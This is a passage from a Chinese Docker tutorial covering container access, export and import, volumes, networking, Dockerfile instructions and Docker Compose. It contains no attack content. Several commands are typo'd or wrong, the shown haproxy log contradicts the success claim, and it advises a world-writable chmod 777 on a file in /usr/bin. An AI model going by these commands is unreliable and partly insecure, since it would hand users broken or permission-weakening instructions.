<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不安全的，ctrl+d 退出时容器也会终止</span><br><span class="line">docker attach [容器Name]</span><br><span class="line"></span><br><span class="line"># 以交互式命令行进入，安全的，推荐使用</span><br><span class="line">docker exec -it [容器Name] /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>命令优化</strong></p>
<ol>
<li>使用 <code>docker exec</code> 命令时，好用，但是命令过长，我们可以通过自定义命令来简化使用</li>
<li>创建文件 <code>/user/bin/ctn</code> 命令文件，内容如下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it $1 /bin/bash</span><br></pre></td></tr></table></figure>

<ol>
<li>检查环境变量有没有配置目录 <code>/usr/bin</code> （一般是有配置在环境变量里面的，不过最好再确认一下）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$PATH</span><br><span class="line">bash: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games: No such file or directory</span><br></pre></td></tr></table></figure>

<ol>
<li>完成上面步骤后，就可以直接通过命令 <code>ctn</code> 来进入容器</li>
</ol>
<blockquote>
<p>注意：如果是使用非 root 账号创建的命令，而 docker 命令是 root 权限，可能存在权限问题，可以通过设置 <code>chmod 777 /usr/bin/ctn</code> 设置权限，使用 <code>sudo ctn [容器Name]</code> 即可进入容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ctn [容器Name]</span><br></pre></td></tr></table></figure>

<ol>
<li>使用上面命令时，容器Name 需要手动输入，容器出错。我们可以借助 <code>complete</code> 命令来补全 容器Name，在 <code>~/.bashrc</code> （作用于当前用户，如果想要所要用户上校，可以修改 <code>/etc/bashrc</code>）文件中添加一行，内容如下。保存后执行 <code>source ~/.bashrc</code> 使之生效，之后我们输入 <code>ctn</code> 后，按 <code>tab</code> 就会提示或自动补全容器名了了</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ctn auto complete</span><br><span class="line">complete -W &quot;$(docker ps --format&quot;&#123;&#123;.Names&#125;&#125;&quot;)&quot; ctn</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意： 由于提示的 容器Name 是 <code>~/.bashrc</code> 生效时的列表，所有如果之后 docker 容器列表有变动，需要重新执行 <code>source ~/.bashrc</code> 使之更新提示列表</p>
</blockquote>
<h3 id="3-6-终止容器"><a href="#3-6-终止容器" class="headerlink" title="3.6 终止容器"></a>3.6 终止容器</h3><p>通过 <code>docker stop [容器Name]</code> 来终止一个<strong>运行中</strong>的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 终止容器名为 test2 的容器</span><br><span class="line">docker stop test2</span><br><span class="line"># 查看正在运行中的容器</span><br><span class="line">docker ps</span><br><span class="line"># 查看所有容器（包括终止的）</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<h3 id="3-7-将容器保存为镜像"><a href="#3-7-将容器保存为镜像" class="headerlink" title="3.7 将容器保存为镜像"></a>3.7 将容器保存为镜像</h3><p>我们修改一个容器后，可以经当前容器状态打包成镜像，方便下次直接通过镜像仓库生成当前状态的容器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建容器</span><br><span class="line">docker run -t -i training/sinatra /bin/bash</span><br><span class="line"></span><br><span class="line"># 添加两个应用</span><br><span class="line">gem install json</span><br><span class="line"></span><br><span class="line"># 将修改后的容器打包成新的镜像</span><br><span class="line">docker commit -m &quot;Added json gem&quot; -a &quot;Docker Newbee&quot; 0b2616b0e5a8 ouruser/sinatra:v2</span><br></pre></td></tr></table></figure>

<h3 id="3-8-导出-导入容器"><a href="#3-8-导出-导入容器" class="headerlink" title="3.8 导出/导入容器"></a>3.8 导出/导入容器</h3><p>容器 -&gt;导出&gt; 容器快照文件 -&gt;导入&gt; 本地镜像仓库 -&gt;新建&gt; 容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                               NAMES</span><br><span class="line">2a8bffa405c8        ubuntu:14.04        &quot;/bin/sh -c &#x27;while t…&quot;   About an hour ago   Up 3 seconds                                            test2</span><br><span class="line"></span><br><span class="line"># 导出</span><br><span class="line">$ docker export 2a8bffa405c8 &gt; ubuntu.tar</span><br><span class="line"></span><br><span class="line"># 导入为镜像</span><br><span class="line">$ docker ubuntu.tar | docker import - test/ubuntu:v1.0</span><br><span class="line"></span><br><span class="line"># 从指定 URL 或者某个目录导入</span><br><span class="line">$ docker import http://example.com/exampleimage.tgz example/imagerepo</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：用户既可以通过 <code>docker load</code> 来导入镜像存储文件到本地镜像仓库，也可以使用 <code>docker import</code> 来导入一个容器快找到本地镜像仓库，两者的区别在于容器快照将丢失所有的历史记录和元数据信息，仅保存容器当时的状态，而镜像存储文件将保存完成的记录，体积要更大。所有容器快照文件导入时需要重新指定标签等元数据信息。</p>
</blockquote>
<h3 id="3-9-删除容器"><a href="#3-9-删除容器" class="headerlink" title="3.9 删除容器"></a>3.9 删除容器</h3><p>可以使用 <code>docker rm [容器Name]</code> 来删除一个终止状态的容器，如果容器还未终止，可以先使用 <code>docker stop [容器Name]</code> 来终止容器，再进行删除操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm test2</span><br><span class="line"></span><br><span class="line"># 删除容器 -f: 强制删除，无视是否运行</span><br><span class="line">$ docker [-f] rm myubuntu</span><br><span class="line"></span><br><span class="line"># 删除所有已关闭的容器</span><br><span class="line">$ docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure>

<h3 id="3-10-查看容器状态"><a href="#3-10-查看容器状态" class="headerlink" title="3.10 查看容器状态"></a>3.10 查看容器状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stats $(docker ps --format=&#123;&#123;.Names&#125;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="四、数据卷"><a href="#四、数据卷" class="headerlink" title="四、数据卷"></a>四、数据卷</h2><h3 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h3><p>数据卷是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多特性：</p>
<ul>
<li>数据卷可以在容器之间共享和重用</li>
<li>对数据卷的修改会立马生效</li>
<li>对数据卷的更新，不会影响镜像</li>
<li>卷会一直存在，直到没有容器使用</li>
</ul>
<blockquote>
<p>数据卷类似于 Linux 下对目录或文件进行 mount</p>
</blockquote>
<h3 id="4-2-创建数据卷"><a href="#4-2-创建数据卷" class="headerlink" title="4.2 创建数据卷"></a>4.2 创建数据卷</h3><p>在用 <code>docker run</code> 命令的时候，使用 <code>-v</code> 标记来创建一个数据卷并挂在在容器里，可同时挂在多个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个 web 容器，并加载一个数据卷到容器的 /webapp 目录</span><br><span class="line">docker run -d -P --name web -v /webapp training/webapp python app.py</span><br><span class="line"></span><br><span class="line"># 挂载一个宿主机目录 /data/webapp 到容器中的 /opt/webapp</span><br><span class="line">docker run -d -P --name web -v /src/webapp:/opt/webapp training/webapp python app.py</span><br><span class="line"></span><br><span class="line"># 默认是读写权限，也可以指定为只读</span><br><span class="line">docker run -d -P --name web -v /src/webapp:/opt/webapp:ro</span><br><span class="line"></span><br><span class="line"># 挂载单个文件</span><br><span class="line">docker run --rm -it -v ~/.bash_history:/.bash_history ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="4-3-数据卷容器"><a href="#4-3-数据卷容器" class="headerlink" title="4.3 数据卷容器"></a>4.3 数据卷容器</h3><p>如果需要多个容器共享数据，最好创建数据卷容器，就是一个正常的容器，撰文用来提供数据卷供其他容器挂载的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个数据卷容器 dbdata</span><br><span class="line">docker run -d -v /dbdata --name dbdata training/postgres echo Data-only container for postgres</span><br><span class="line"></span><br><span class="line"># 其他容器挂载 dbdata 容器的数据卷</span><br><span class="line">docker run -d --volumes-from dbdata --name db1 training/postgres</span><br><span class="line">docker run -d --volumes-from dbdata --name db2 training/postgres</span><br></pre></td></tr></table></figure>

<h2 id="五、网络"><a href="#五、网络" class="headerlink" title="五、网络"></a>五、网络</h2><h3 id="5-1-外部访问容器"><a href="#5-1-外部访问容器" class="headerlink" title="5.1 外部访问容器"></a>5.1 外部访问容器</h3><p>在容器内运行一些服务，需要外部可以访问到这些服务，可以通过 <code>-P</code> 或 <code>-p</code> 参数来指定端口映射。</p>
<p>当使用 <code>-P</code> 标记时，Docker 会随即映射一个 <code>49000～49900</code> 的端口到内部容器开放的网络端口。</p>
<p>使用 <code>docker ps</code> 可以查看端口映射情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                               NAMES</span><br><span class="line">7f43807dc042        training/webapp     &quot;python app.py&quot;          3 seconds ago       Up 2 seconds        0.0.0.0:32770-&gt;5000/tcp             amazing_liskov</span><br></pre></td></tr></table></figure>

<p>-p 指定端口映射，支持格式 <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不限制ip访问</span><br><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line"># 只允许宿主机回环地址访问</span><br><span class="line">docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py</span><br><span class="line"># 宿主机自动分配绑定端口</span><br><span class="line">docker run -d -p 127.0.0.1::5000 training/webapp python app.py</span><br><span class="line"># 指定 udp 端口</span><br><span class="line">docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py</span><br><span class="line"># 指定多个端口映射</span><br><span class="line">docker run -d -p 5000:5000  -p 3000:80 training/webapp python app.py</span><br><span class="line"># 查看映射端口配置</span><br><span class="line">$ docker port amazing_liskov</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:32770</span><br></pre></td></tr></table></figure>

<h3 id="5-2-容器互联"><a href="#5-2-容器互联" class="headerlink" title="5.2 容器互联"></a>5.2 容器互联</h3><p>容器除了跟宿主机端口映射外，还有一种容器间交互的方式，可以在源/目标容器之间建立一个隧道，目标容器可以看到源容器指定的信息。</p>
<p>可以通过 <code>--link name:alias</code> 来连接容器，下面就是 “web容器连接db容器” 的例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建 容器db</span><br><span class="line">docker run -d --name db training/postgres</span><br><span class="line"># 创建 容器web 并连接到 容器db</span><br><span class="line">docker run -d -P --name web --link db:db training/webapp python app.py</span><br><span class="line"></span><br><span class="line"># 进入 容器web，测试连通性</span><br><span class="line">$ ctn web</span><br><span class="line">$ ping db</span><br><span class="line">PING db (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from db (172.17.0.3): icmp_seq=1 ttl=64 time=0.254 ms</span><br><span class="line">64 bytes from db (172.17.0.3): icmp_seq=2 ttl=64 time=0.190 ms</span><br><span class="line">64 bytes from db (172.17.0.3): icmp_seq=3 ttl=64 time=0.389 ms</span><br></pre></td></tr></table></figure>

<h3 id="5-3-访问控制"><a href="#5-3-访问控制" class="headerlink" title="5.3 访问控制"></a>5.3 访问控制</h3><p>容器想要访问外部网络，需要宿主机的转发支持。在 Linux 系统中，通过以下命令检查是否打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sysctl net.ipv4.ip_forward</span><br><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>

<p>如果是 0，说明没有开启转发，则需要手动打开。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>

<h3 id="5-4-配置-docker0-桥接"><a href="#5-4-配置-docker0-桥接" class="headerlink" title="5.4 配置 docker0 桥接"></a>5.4 配置 docker0 桥接</h3><p>Docker 服务默认会创建一个 <code>docker0</code> 网桥，他在内核层连通了其他物理或虚拟网卡，这就将容器和主机都放在同一个物理网络。</p>
<p>Docker 默认制定了 <code>docker0</code> 接口的IP地址和子网掩码，让主机和容器间可以通过网桥相互通信，他还给了 MTU（接口允许接收的最大单元），通常是 1500 Bytes，或宿主机网络路由上支持的默认值。这些都可以在服务启动的时候进行配置。</p>
<ul>
<li><code>--bip=CIDR</code> ip地址加子网掩码格式，如 192.168.1.5/24</li>
<li><code>--mtu=BYTES</code> 覆盖默认的 Docker MTU 配置</li>
</ul>
<p>可以通过 <code>brctl show</code> 来查看网桥和端口连接信息</p>
<h3 id="5-5-网络配置文件"><a href="#5-5-网络配置文件" class="headerlink" title="5.5 网络配置文件"></a>5.5 网络配置文件</h3><p>Docker 1.2.0 开始支持在运行中的容器里编辑 <code>/etc/hosts</code> 、<code>/etc/hostsname</code> 和 <code>/etc/resolve.conf</code> 文件，修改都是临时的，重新容器将会丢失修改，通过 <code>docker commit</code> 也不会被提交。</p>
<h2 id="六、Dockerfile"><a href="#六、Dockerfile" class="headerlink" title="六、Dockerfile"></a>六、Dockerfile</h2><h3 id="6-1-介绍"><a href="#6-1-介绍" class="headerlink" title="6.1 介绍"></a>6.1 介绍</h3><p>Dockerfile 是由一行行命令组成的命令集合，分为四个部分：</p>
<ol>
<li>基础镜像信息</li>
<li>维护着信息</li>
<li>镜像操作指令</li>
<li>容器启动时执行指令</li>
</ol>
<p>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 最前面一般放这个 Dockerfile 的介绍、版本、作者及使用说明等</span><br><span class="line"># This dockerfile uses the ubuntu image</span><br><span class="line"># VERSION 2 - EDITION 1</span><br><span class="line"># Author: docker_user</span><br><span class="line"># Command format: Instruction [arguments / command] ..</span><br><span class="line"></span><br><span class="line"># 使用的基础镜像，必须放在非注释第一行</span><br><span class="line">FROM ubuntu</span><br><span class="line"></span><br><span class="line"># 维护着信息信息： 名字 联系方式</span><br><span class="line">MAINTAINER docker_user docker_user@email.com</span><br><span class="line"></span><br><span class="line"># 构建镜像的命令：对镜像做的调整都在这里</span><br><span class="line">RUN echo &quot;deb http://archive.ubuntu.com/ubuntu/ raring main universe&quot; &gt;&gt; /etc/apt/sources.list</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y nginx</span><br><span class="line">RUN echo &quot;\ndaemon off;&quot; &gt;&gt; /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"># 创建/运行 容器时的操作指令 </span><br><span class="line"># 可以理解为 docker run 后跟的运行指令</span><br><span class="line">CMD /usr/sbin/nginx</span><br></pre></td></tr></table></figure>

<h3 id="6-2-指令"><a href="#6-2-指令" class="headerlink" title="6.2 指令"></a>6.2 指令</h3><p>指令一般格式为 <code>INSTRUCTION args</code>，包括 <code>FORM</code> 、 <code>MAINTAINER</code> 、<code>RUN</code> 等</p>
<table>
<thead>
<tr>
<th>FORM</th>
<th>第一条指令必须是 <code>FORM</code> 指令，并且如果在同一个<code>Dockerfile</code> 中创建多个镜像，可以使用多个 <code>FROM</code> 指令（每个镜像一次）</th>
<th>FORM ubuntuFORM ubuntu:14.04</th>
</tr>
</thead>
<tbody><tr>
<td>MAINTAINER</td>
<td>维护者信息</td>
<td>MAINTAINER Chris <a href="mailto:&#x78;&#x78;&#64;&#103;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">&#x78;&#x78;&#64;&#103;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a></td>
</tr>
<tr>
<td>RUN</td>
<td>每条 RUN 指令在当前镜像基础上执行命令，并提交为新的镜像。当命令过长时可以使用 <code>\</code> 来换行</td>
<td>在 shell 终端中运行命令<code>RUN apt-get update &amp;&amp; apt-get install -y nginx</code>在 <code>exec</code> 中执行:<code>RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;echo hello&quot;]</code></td>
</tr>
<tr>
<td>CMD</td>
<td>指定启动容器时执行的命令，每个 Dockerfile 只能有一条 CMD 命令。如果指定了多条命令，只有最后一条会被执行。</td>
<td><code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code> 使用 <code>exec</code> 执行，推荐方式；<code>CMD command param1 param2</code> 在 <code>/bin/sh</code> 中执行，提供给需要交互的应用；<code>CMD [&quot;param1&quot;,&quot;param2&quot;]</code> 提供给 <code>ENTRYPOINT</code> 的默认参数；</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>告诉服务端容器暴露的端口号，</td>
<td>EXPOSE <port></td>
</tr>
<tr>
<td>ENV</td>
<td>指定环境变量</td>
<td>ENV PG_MAJOR 9.3ENV PATH /usr/local/postgres-$PG_MAJOR/bin:$PATH</td>
</tr>
<tr>
<td>ADD</td>
<td><code>ADD  </code>该命令将复制指定的 <code> </code>到容器中的 <code>。其中 </code> 可以是 <code>Dockerfile</code> 所在目录的一个相对路径，也可以是一个<code>URL</code>；还可以是一个 tar文件（自动解压为目录）</td>
<td></td>
</tr>
<tr>
<td>COPY</td>
<td>格式为 <code>COPY  </code>复制本地主机的 <code>（为 Dockerfile 所在目录的相对路径）到容器中的</code> 。当使用本地目录为源目录时，推荐使用 <code>COPY</code></td>
<td></td>
</tr>
<tr>
<td>ENTRYPOINT</td>
<td>配置容器启动执行的命令，并且不可被 <code>docker run</code> 提供的参数覆盖每个Docekrfile 中只能有一个 <code>ENTRYPOINT</code> ，当指定多个时，只有最后一个起效</td>
<td>两种格式<code>ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]``ENTRYPOINT command param1 param2</code>（shell中执行）</td>
</tr>
<tr>
<td>VOLUME</td>
<td>创建一个可以从本地主机或其他容器挂载的挂载点，一般用来存放数据库和需要保持的数据等。</td>
<td>VOLUME [“/data”]</td>
</tr>
<tr>
<td>USER</td>
<td>指定运行容器时的用户名或 UID，后续的 <code>RUN</code> 也会使用指定用户</td>
<td>USER daemon</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>为后续的 <code>RUN</code>、<code>CMD</code>、<code>ENTRYPOINT</code> 指令配置工作目录。可以使用多个 <code>WORKDIR</code> 指令，后续命令如果参数是相对路径，则会基于之前命令指定的路径。</td>
<td>格式为 <code>WORKDIR /path/to/workdir</code>。 WORKDIR /aWORKDIR bWORKDIR cRUN pwd最后的路径为 /a/b/c</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>配置当所创建的镜像作为其它新创建镜像的基础镜像时，所执行的操作指令。</td>
<td>格式为 <code>ONBUILD [INSTRUCTION]</code>。</td>
</tr>
</tbody></table>
<h3 id="6-3-创建镜像"><a href="#6-3-创建镜像" class="headerlink" title="6.3 创建镜像"></a>6.3 创建镜像</h3><p>编写完成 Dockerfile 之后，可以通过 <code>docker build</code> 命令来创建镜像</p>
<p><code>docker build [选项] 路径</code> 该命令江都区指定路径下（包括子目录）的Dockerfile，并将该路径下所有内容发送给 Docker 服务端，有服务端来创建镜像。可以通过 <code>.dockerignore</code> 文件来让 Docker 忽略路径下的目录与文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 -t 指定镜像的标签信息</span><br><span class="line">docker build -t myrepo/myimage .</span><br></pre></td></tr></table></figure>

<h2 id="七、Docker-Compose"><a href="#七、Docker-Compose" class="headerlink" title="七、Docker Compose"></a>七、Docker Compose</h2><h3 id="7-1-介绍"><a href="#7-1-介绍" class="headerlink" title="7.1 介绍"></a>7.1 介绍</h3><p>Docker Compose 是 Docker 官方编排项目之一，负责快速在集群中部署分布式应用。维护地址：<a href="https://github.com/docker/compose%EF%BC%8C%E7%94%B1">https://github.com/docker/compose，由</a> Python 编写，实际调用 Docker提供的API实现。</p>
<p>Dockerfile 可以让用户管理一个单独的应用容器，而 Compose 则允许用户在一个模版（YAML格式）中定义一组相关联的应用容器（被称为一个project/项目），例如一个 web容器再加上数据库、redis等。</p>
<h3 id="7-2-安装"><a href="#7-2-安装" class="headerlink" title="7.2 安装"></a>7.2 安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 pip 进行安装</span><br><span class="line">pip install -U docker-compose</span><br><span class="line"></span><br><span class="line"># 查看用法</span><br><span class="line">docker-ompose -h</span><br><span class="line"></span><br><span class="line"># 添加 bash 补全命令</span><br><span class="line">curl -L https://raw.githubusercontent.com/docker/compose/1.2.0/contrib/completion/bash/docker-compose &gt; /etc/bash_completion.d/docker-compose</span><br></pre></td></tr></table></figure>



<h3 id="7-3-使用"><a href="#7-3-使用" class="headerlink" title="7.3 使用"></a>7.3 使用</h3><p>术语</p>
<ul>
<li>服务/service： 一个应用容器，实际上可以运行多个相同镜像的实例</li>
<li>项目/project： 有一组关联的应用容器组成的完成业务单元</li>
</ul>
<p>示例：创建一个 Haproxy 挂载三个 Web 容器</p>
<p>创建一个 <code>compose-haproxy-web</code> 目录，作为项目工作目录，并在其中分别创建两个子目录： <code>haproxy</code> 和 <code>web</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compose-haproxy-webcompose-haproxy-web</span><br><span class="line">git clone https://github.com/yelog/compose-haproxy-web.git</span><br></pre></td></tr></table></figure>

<p>目录长这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compose-haproxy-web</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── haproxy</span><br><span class="line">│   └── haproxy.cfg</span><br><span class="line">└── web</span><br><span class="line">    ├── Dockerfile</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── index.py</span><br></pre></td></tr></table></figure>

<p>在该目录执行 <code>docker-compose up</code> 命令，会整合输出所有容器的输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker-compose up</span><br><span class="line">Starting compose-haproxy-web_webb_1 ... done</span><br><span class="line">Starting compose-haproxy-web_webc_1 ... done</span><br><span class="line">Starting compose-haproxy-web_weba_1 ... done</span><br><span class="line">Recreating compose-haproxy-web_haproxy_1 ... done</span><br><span class="line">Attaching to compose-haproxy-web_webb_1, compose-haproxy-web_weba_1, compose-haproxy-web_webc_1, compose-haproxy-web_haproxy_1</span><br><span class="line">haproxy_1  | [NOTICE] 244/131022 (1) : haproxy version is 2.2.2</span><br><span class="line">haproxy_1  | [NOTICE] 244/131022 (1) : path to executable is /usr/local/sbin/haproxy</span><br><span class="line">haproxy_1  | [ALERT] 244/131022 (1) : parsing [/usr/local/etc/haproxy/haproxy.cfg:14] : &#x27;listen&#x27; cannot handle unexpected argument &#x27;:70&#x27;.</span><br><span class="line">haproxy_1  | [ALERT] 244/131022 (1) : parsing [/usr/local/etc/haproxy/haproxy.cfg:14] : please use the &#x27;bind&#x27; keyword for listening addresses.</span><br><span class="line">haproxy_1  | [ALERT] 244/131022 (1) : Error(s) found in configuration file : /usr/local/etc/haproxy/haproxy.cfg</span><br><span class="line">haproxy_1  | [ALERT] 244/131022 (1) : Fatal errors found in configuration.</span><br><span class="line">compose-haproxy-web_haproxy_1 exited with code 1</span><br></pre></td></tr></table></figure>

<p>此时访问本地的 80 端口，会经过 haproxy 自动转发到后端的某个 web 容器上，刷新页面，可以观察到访问的容器地址的变化。</p>
<h3 id="7-4-命令说明"><a href="#7-4-命令说明" class="headerlink" title="7.4 命令说明"></a>7.4 命令说明</h3><p>大部分命令都可以运行在一个或多个服务上。如果没有特别的说明，命令则应用在项目所有的服务上。</p>
<p>执行 <code>docker-compose [COMMAND] --help</code> 查看具体某个命令的使用说明</p>
<p>使用格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose [options] [COMMAND] [ARGS...]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>build</th>
<th>构建/重建服务服务一旦构建后，将会带上一个标记名，例如 web_db可以随时在项目目录运行 <code>docker-compose build</code> 来重新构建服务</th>
</tr>
</thead>
<tbody><tr>
<td>help</td>
<td>获得一个命令的信息</td>
</tr>
<tr>
<td>kill</td>
<td>通过发送 <code>SIGKILL</code> 信号来强制停止服务容器，支持通过参数来指定发送信号，例如<code>docker-compose kill -s SIGINT</code></td>
</tr>
<tr>
<td>logs</td>
<td>查看服务的输出</td>
</tr>
<tr>
<td>port</td>
<td>打印绑定的公共端口</td>
</tr>
<tr>
<td>ps</td>
<td>列出所有容器</td>
</tr>
<tr>
<td>pull</td>
<td>拉去服务镜像</td>
</tr>
<tr>
<td>rm</td>
<td>删除停止的服务容器</td>
</tr>
<tr>
<td>run</td>
<td>在一个服务上执行一个命令<code>docker-compose run ubuntu ping docker.com</code></td>
</tr>
<tr>
<td>scale</td>
<td>设置同一个服务运行的容器个数通过 <code>service=num</code> 的参数来设置数量<code>docker-compose scale web=2 worker=3</code></td>
</tr>
<tr>
<td>start</td>
<td>启动一个已经存在的服务容器</td>
</tr>
<tr>
<td>stop</td>
<td>停止一个已经运行的容器，但不删除。可以通过 <code>docker-compose start</code> 再次启动</td>
</tr>
<tr>
<td>up</td>
<td>构建、创建、启动、链接一个服务相关的容器链接服务都将被启动，除非他们已经运行<code>docker-compose up -d</code> 将后台运行并启动<code>docker-compose up</code> 已存在容器将会重新创建<code>docker-compose up --no-recreate</code> 将不会重新创建容器</td>
</tr>
</tbody></table>
<h3 id="7-5-环境变量"><a href="#7-5-环境变量" class="headerlink" title="7.5 环境变量"></a>7.5 环境变量</h3><p>环境变量可以用来配置 Compose 的行为</p>
<p>以 <code>Docker_</code> 开头的变量用来配置 Docker 命令行客户端使用的一样</p>
<table>
<thead>
<tr>
<th>COMPOSE_PROJECT_NAME</th>
<th>设置通过 Compose 启动的每一个容器前添加的项目名称，默认是当前工作目录的名字。</th>
</tr>
</thead>
<tbody><tr>
<td>COMPOSE_FILE</td>
<td>设置要使用的 <code>docker-compose.yml</code> 的路径。默认路径是当前工作目录。</td>
</tr>
<tr>
<td>DOCKER_HOST</td>
<td>设置 Docker daemon 的地址。默认使用 <code>unix:///var/run/docker.sock</code>，与 Docker 客户端采用的默认值一致。</td>
</tr>
<tr>
<td>DOCKER_TLS_VERIFY</td>
<td>如果设置不为空，则与 Docker daemon 交互通过 TLS 进行。</td>
</tr>
<tr>
<td>DOCKER_CERT_PATH</td>
<td>配置 TLS 通信所需要的验证（<code>ca.pem</code>、<code>cert.pem</code> 和 <code>key.pem</code>）文件的路径，默认是 <code>~/.docker</code> 。</td>
</tr>
</tbody></table>
<h3 id="7-6-docker-compose-yml"><a href="#7-6-docker-compose-yml" class="headerlink" title="7.6 docker-compose.yml"></a>7.6 docker-compose.yml</h3><p>默认模版文件是 <code>docker-compose.yml</code> ，启动定义了每个服务都必须经过 <code>image</code> 指令指定镜像或 <code>build</code> 指令（需要 Dockerfile) 来自动构建。</p>
<p>其他大部分指令跟 <code>docker run</code> 类似</p>
<p>如果使用 <code>build</code> 指令，在 Dockerfile 中设置的选项（如 <code>CMD</code> 、<code>EXPOSE</code> 等）将会被自动获取，无需在 <code>docker-compose.yml</code> 中再次设置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**image**</span><br></pre></td></tr></table></figure>

<p>指定镜像名称或镜像ID，如果本地仓库不存在，将尝试从远程仓库拉去此镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">image: ubuntu</span><br><span class="line">image: orchardup/postgresql</span><br><span class="line">image: a4bc65fd</span><br><span class="line">**build**</span><br></pre></td></tr></table></figure>

<p>指定 <code>Dockerfile</code> 所在文件的路径。<code>Compose</code> 将利用它自动构建这个镜像，然后使用这个镜像。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">build: /path/to/build/dir</span><br><span class="line">**command**</span><br></pre></td></tr></table></figure>

<p>覆盖容器启动默认执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command: bundle exec thin -p 3000</span><br><span class="line">**links**</span><br></pre></td></tr></table></figure>

<p>链接到其他服务中的容器，使用服务名称或别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">links:</span><br><span class="line">    - db</span><br><span class="line">  - db:database</span><br><span class="line">  - redis</span><br></pre></td></tr></table></figure>

<p>别名会自动在服务器中的 <code>/etc/hosts</code> 里创建。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.17.2.186  db</span><br><span class="line">172.17.2.186  database</span><br><span class="line">172.17.2.187  redis</span><br><span class="line">**external_links**</span><br></pre></td></tr></table></figure>

<p>连接到 <code>docker-compose.yml</code> 外部的容器，甚至并非 <code>Compose</code> 管理的容器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">external_links:</span><br><span class="line"> - redis_1</span><br><span class="line"> - project_db_1:mysql</span><br><span class="line"> - project_db_1:postgresql</span><br></pre></td></tr></table></figure>

<p><strong><code>ports</code></strong></p>
<p>暴露端口信息 <code>HOST:CONTAINER</code></p>
<p>格式或者仅仅指定容器的端口（宿主机会随机分配端口）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ports:</span><br><span class="line"> - &quot;3000&quot;</span><br><span class="line"> - &quot;8000:8000&quot;</span><br><span class="line"> - &quot;49100:22&quot;</span><br><span class="line"> - &quot;127.0.0.1:8001:8001&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><em>注：当使用 <code>HOST:CONTAINER</code> 格式来映射端口时，如果你使用的容器端口小于 60 你可能会得到错误得结果，因为 <code>YAML</code> 将会解析 <code>xx:yy</code> 这种数字格式为 60 进制。所以建议采用字符串格式。</em></p>
</blockquote>
